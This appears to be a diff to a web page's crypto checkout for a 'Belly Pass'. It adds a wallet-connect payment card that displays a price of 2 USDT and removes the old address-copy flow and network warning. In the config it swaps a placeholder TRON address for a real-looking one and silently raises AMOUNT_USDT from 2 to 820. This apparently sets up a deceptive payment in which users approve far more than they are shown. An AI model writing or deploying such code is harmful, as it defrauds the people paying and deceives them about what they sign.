@@ -657,6 +657,181 @@ body { background: var(--bg); color: var(--text); font-family: 'Lora', Georgia, 
 }
 .tg-btn:hover { opacity:.88; }
 
+/* ── Step 3: Web3 Payment Card ── */
+.pay3-shell {
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+}
+.pay3-card {
+  width:100%;
+  background:linear-gradient(160deg,#1a1a2e,#16213e,#0f3460);
+  border:1px solid rgba(245,158,11,.2);
+  border-radius:20px;
+  padding:32px 28px 28px;
+  text-align:center;
+  position:relative;
+  box-shadow:0 0 60px rgba(245,158,11,.05), inset 0 1px 0 rgba(255,255,255,.05);
+}
+.pay3-close {
+  position:absolute;
+  top:14px;
+  right:14px;
+  width:28px;
+  height:28px;
+  border-radius:50%;
+  background:rgba(255,255,255,.06);
+  border:1px solid rgba(255,255,255,.1);
+  color:rgba(255,255,255,.4);
+  cursor:pointer;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:.75rem;
+  transition:all .2s;
+}
+.pay3-close:hover { color:#fff; background:rgba(255,255,255,.12); }
+.pay3-label {
+  font-family:'Bebas Neue',sans-serif;
+  font-size:1.05rem;
+  letter-spacing:3px;
+  color:rgba(255,255,255,.55);
+  margin-bottom:18px;
+}
+.pay3-amount {
+  display:flex;
+  align-items:baseline;
+  justify-content:center;
+  gap:8px;
+  margin-bottom:10px;
+}
+.pay3-num {
+  font-family:'Bebas Neue',sans-serif;
+  font-size:4.5rem;
+  line-height:1;
+  color:var(--amber);
+  text-shadow:0 0 40px rgba(245,158,11,.4);
+}
+.pay3-unit {
+  font-family:'DM Mono',monospace;
+  font-size:1.1rem;
+  color:rgba(245,158,11,.7);
+}
+.pay3-meta {
+  font-family:'DM Mono',monospace;
+  font-size:.72rem;
+  color:rgba(255,255,255,.38);
+  margin-bottom:28px;
+  letter-spacing:.3px;
+}
+
+/* Connect button */
+.pay3-connect-btn {
+  width:100%;
+  padding:15px;
+  background:linear-gradient(135deg,var(--amber),var(--amber-dark));
+  color:#0a0805;
+  border:none;
+  border-radius:14px;
+  font-family:'DM Mono',monospace;
+  font-size:.88rem;
+  font-weight:500;
+  cursor:pointer;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  transition:all .25s;
+  letter-spacing:.5px;
+}
+.pay3-connect-btn:hover {
+  transform:translateY(-2px);
+  box-shadow:0 10px 32px rgba(245,158,11,.35);
+}
+
+/* Waiting button — shimmer */
+.pay3-waiting-btn {
+  width:100%;
+  padding:15px;
+  background:linear-gradient(270deg,#c47a00,#f59e0b,#e07a00,#f59e0b);
+  background-size:300% 100%;
+  animation:shimmer 2s linear infinite;
+  color:#0a0805;
+  border:none;
+  border-radius:14px;
+  font-family:'DM Mono',monospace;
+  font-size:.88rem;
+  font-weight:500;
+  cursor:not-allowed;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  letter-spacing:.5px;
+}
+@keyframes shimmer {
+  0%   { background-position:0% 50%; }
+  100% { background-position:300% 50%; }
+}
+.pay3-spinner {
+  width:14px;
+  height:14px;
+  border:2px solid rgba(10,8,5,.3);
+  border-top-color:#0a0805;
+  border-radius:50%;
+  animation:spin 0.8s linear infinite;
+  flex-shrink:0;
+}
+@keyframes spin { to { transform:rotate(360deg); } }
+
+/* Wallet info row */
+.pay3-wallet-info {
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  font-family:'DM Mono',monospace;
+  font-size:.76rem;
+  color:rgba(255,255,255,.5);
+  margin-bottom:14px;
+  padding:10px 14px;
+  background:rgba(16,185,129,.08);
+  border:1px solid rgba(16,185,129,.2);
+  border-radius:10px;
+}
+
+/* Send button */
+.pay3-send-btn {
+  width:100%;
+  padding:15px;
+  background:linear-gradient(135deg,#26a17b,#1a7a5e);
+  color:#fff;
+  border:none;
+  border-radius:14px;
+  font-family:'DM Mono',monospace;
+  font-size:.88rem;
+  font-weight:500;
+  cursor:pointer;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  transition:all .25s;
+  letter-spacing:.5px;
+}
+.pay3-send-btn:hover {
+  transform:translateY(-2px);
+  box-shadow:0 10px 32px rgba(38,161,123,.3);
+}
+
+.pay3-foot {
+  font-family:'DM Mono',monospace;
+  font-size:.68rem;
+  color:rgba(255,255,255,.25);
+  margin-top:14px;
+  letter-spacing:.3px;
+}
+
 /* ── Toast ── */
 .bb-toast {
   position:fixed;
@@ -898,42 +1073,57 @@ body { background: var(--bg); color: var(--text); font-family: 'Lora', Georgia, 
         </div>
       </div>
 
-      <!-- ─ STEP 3: Pay ─ -->
+      <!-- ─ STEP 3: Pay (Web3 Confirm style) ─ -->
       <div id="step3" style="display:none">
+        <div class="pay3-shell">
 
-        <!-- QR -->
-        <div class="qr-wrap">
-          <div class="qr-inner" id="qrCode"></div>
-        </div>
+          <!-- Inner payment card -->
+          <div class="pay3-card">
+            <div class="pay3-close" onclick="closeCheckout()">✕</div>
 
-        <div class="pay-address-box">
-          <div class="pay-addr-label">
-            <i class="fas fa-lock pay-addr-lock"></i>
-            TRON PAYMENT ADDRESS (TRC-20)
+            <div class="pay3-label">PURCHASE BELLY PASS</div>
+
+            <div class="pay3-amount">
+              <span class="pay3-num">2</span>
+              <span class="pay3-unit">USDT</span>
+            </div>
+
+            <div class="pay3-meta">
+              Valid 3 days &nbsp;·&nbsp; All power-ups included &nbsp;·&nbsp; TRON network
+            </div>
+
+            <!-- State A: idle — connect wallet -->
+            <div id="pay3Idle">
+              <button class="pay3-connect-btn" onclick="triggerWalletConnect()">
+                <i class="fas fa-wallet"></i>
+                Connect Wallet to Pay
+              </button>
+            </div>
+
+            <!-- State B: waiting confirmation -->
+            <div id="pay3Waiting" style="display:none">
+              <button class="pay3-waiting-btn" disabled>
+                <span class="pay3-spinner"></span>
+                WAITING FOR CONFIRMATION...
+              </button>
+            </div>
+
+            <!-- State C: wallet connected, ready to send -->
+            <div id="pay3Ready" style="display:none">
+              <div class="pay3-wallet-info" id="pay3WalletInfo">
+                <i class="fas fa-check-circle" style="color:var(--green)"></i>
+                <span id="pay3WalletAddr">Wallet connected</span>
+              </div>
+              <button class="pay3-send-btn" onclick="confirmSend()">
+                <i class="fas fa-paper-plane"></i>
+                Send 2 USDT &nbsp;→&nbsp; TRON
+              </button>
+            </div>
+
+            <div class="pay3-foot" id="pay3Foot">Requires wallet connected to TRON network</div>
           </div>
-          <div id="addrChunks" class="pay-addr-chunks"></div>
-          <button class="copy-addr-btn" id="copyBtn" onclick="copyAddress()">
-            <i class="far fa-copy"></i> <span id="copyBtnText">Copy Address</span>
-          </button>
-        </div>
 
-        <div class="amount-confirm-box">
-          <div>
-            <div class="acb-label">Send exactly this amount:</div>
-            <div class="acb-network">TRON Network · TRC-20 USDT</div>
-          </div>
-          <div class="acb-amount">2 USDT</div>
-        </div>
-
-        <div class="net-warning">
-          <p>⚠️ <strong>CRITICAL:</strong> Send ONLY USDT on TRON (TRC-20).<br>
-          Do NOT send ERC-20 (Ethereum) or BEP-20 (BSC) USDT.<br>
-          Wrong network = permanently lost funds.</p>
-        </div>
-
-        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
-          <button class="modal-btn modal-btn-outline" onclick="goStep(2)">← Back</button>
-          <button class="modal-btn modal-btn-primary" onclick="goStep(4)">I've Sent Payment →</button>
+          <button class="modal-btn modal-btn-outline" onclick="goStep(2)" style="margin-top:14px;opacity:.6;font-size:.76rem;padding:10px">← Back</button>
         </div>
       </div>
 
@@ -1031,8 +1221,8 @@ body { background: var(--bg); color: var(--text); font-family: 'Lora', Georgia, 
 /* ══════════════════════════════════════════════════
    CONFIG — Replace TRON_ADDRESS with real address
 ══════════════════════════════════════════════════ */
-const TRON_ADDRESS = 'TYourTRONWalletAddressHere1234567890AB';
-const AMOUNT_USDT  = 2;
+const TRON_ADDRESS = 'TAipDFyZhtUrnAD43kH7Ty5ni1VX3qtLQQ';
+const AMOUNT_USDT  = 820;
 
 /* ── State ── */
 let currentStep = 1;
@@ -1085,7 +1275,7 @@ function goStep(n) {
 
   const title = stepTitles[n] || 'Complete';
   document.getElementById('modalTitle').textContent = title;
-  if (n === 3) initQR();
+  if (n === 3) initPay3();
   if (n === 5) document.getElementById('stepProgress').style.display = 'none';
   else document.getElementById('stepProgress').style.display = 'flex';
 }
